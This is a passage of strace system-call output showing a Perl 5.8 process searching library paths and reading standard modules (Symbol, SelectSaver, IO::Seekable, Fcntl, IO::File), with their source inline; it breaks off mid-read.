8191  07:22:17.454620 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.454634 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.454647 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.454661 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.454673 stat64("/usr/lib/perl5/Symbol.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.454686 stat64("/usr/share/perl5/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.454698 stat64("/usr/share/perl5/Symbol.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.454712 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.454724 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.454738 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.454751 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
8191  07:22:17.454785 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.454843 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.454855 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.454873 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
8189  07:22:17.455049 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
8191  07:22:17.455359 read(8,  <unfinished ...>
8189  07:22:17.455370 <... rt_sigprocmask resumed> NULL, 8) = 0
8189  07:22:17.455387 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8189  07:22:17.455403 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8189  07:22:17.455413 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8189  07:22:17.455426 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8189  07:22:17.455440 waitpid(-1,  <unfinished ...>
8191  07:22:17.455451 <... read resumed> "", 4096) = 0
8191  07:22:17.455459 close(8)          = 0
8191  07:22:17.455525 stat64("/etc/perl/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455541 stat64("/etc/perl/SelectSaver.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.455556 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455569 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.455583 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455596 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.455611 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455623 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.455636 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455649 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.455662 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455676 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.455690 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.455707 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
8191  07:22:17.455729 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.455744 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.455755 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.455785 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
8191  07:22:17.455952 brk(0x81d6000)    = 0x81d6000
8191  07:22:17.455982 read(8, "", 4096) = 0
8191  07:22:17.455994 close(8)          = 0
8191  07:22:17.456465 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
8191  07:22:17.457146 read(6, "", 4096) = 0
8191  07:22:17.457163 close(6)          = 0
8191  07:22:17.457203 stat64("/etc/perl/IO/Seekable.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457218 stat64("/etc/perl/IO/Seekable.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457233 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457246 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457274 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457311 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457326 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457352 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457365 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457378 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457391 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.457404 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
8191  07:22:17.457427 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.457442 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.457454 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.457473 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
8191  07:22:17.457603 stat64("/etc/perl/Fcntl.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.457618 stat64("/etc/perl/Fcntl.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.457631 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.457645 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.457659 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.457672 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.457686 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.457698 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.457715 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.457727 stat64("/usr/share/perl5/Fcntl.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.457740 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.458134 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
8191  07:22:17.458254 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.458306 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.458337 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.458370 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
8191  07:22:17.458836 brk(0x81f7000)    = 0x81f7000
8191  07:22:17.459030 read(8, "", 4096) = 0
8191  07:22:17.459044 close(8)          = 0
8191  07:22:17.459116 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8191  07:22:17.459141 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8191  07:22:17.459167 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
8191  07:22:17.459182 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
8191  07:22:17.459257 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8191  07:22:17.459257 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d5d000
8191  07:22:17.459257 mmap2(0xb7d60000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d60000
8191  07:22:17.459257 close(8)          = 0
8191  07:22:17.459257 read(6, "", 4096) = 0
8191  07:22:17.459258 close(6)          = 0
8191  07:22:17.459258 stat64("/etc/perl/IO/File.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459258 stat64("/etc/perl/IO/File.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459272 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459296 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459339 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459367 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459382 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459394 stat64("/usr/lib/perl5/IO/File.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459408 stat64("/usr/share/perl5/IO/File.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459421 stat64("/usr/share/perl5/IO/File.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459434 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.459461 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
8191  07:22:17.459482 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.459497 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.459513 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.459531 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" 